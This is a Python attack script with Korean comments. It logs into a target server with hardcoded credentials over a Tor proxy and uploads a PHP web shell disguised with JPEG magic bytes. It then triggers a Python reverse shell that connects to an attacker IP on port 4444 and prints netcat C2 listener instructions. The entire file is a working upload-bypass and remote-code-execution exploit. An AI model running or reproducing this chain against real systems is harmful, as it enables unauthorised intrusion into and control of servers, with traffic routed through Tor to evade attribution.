#!/usr/bin/env python3
"""
새로 업로드 + 즉시 실행
"""

import requests
import sys
import time
import random
import string

target_ip = "43.201.154.142"
attacker_ip = "57.181.28.7"
attacker_port = "4444"

base_url = f"http://{target_ip}"

session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

print(f"[*] 새로 업로드 + 즉시 실행")
print(f"[*] C2 리스너: nc -lvnp {attacker_port}\n")

# alice 로그인
data = {'username': 'alice', 'password': 'alice2024'}
resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
print("[+] alice 로그인\n")

# 새 웹쉘 생성
random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
filename = f"{random_name}.php"

webshell_code = b'<?php system($_GET["x"]); ?>'

# JPEG 매직 바이트 추가
jpeg_magic = b'\xFF\xD8\xFF\xE0'
full_content = jpeg_magic + b'\x00' * 50 + webshell_code

files = {
    'file': (filename, full_content, 'image/jpeg')
}

print(f"[1] 웹쉘 업로드: {filename}")
resp = session.post(f"{base_url}/upload.php", files=files, timeout=10)

if resp.status_code == 200:
    print(f"[+] 업로드 성공\n")

    # 즉시 실행
    print(f"[2] 리버스 쉘 실행...")

    reverse_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &"

    exec_url = f"{base_url}/file.php?name=uploads/{filename}&x={reverse_shell}"

    try:
        resp = session.get(exec_url, timeout=5)
        print(f"[+] 실행 완료")
    except:
        print(f"[+] 타임아웃 (연결 가능성!)")

    print(f"\n[!] C2 리스너 확인하세요!")

else:
    print(f"[-] 업로드 실패: {resp.status_code}")
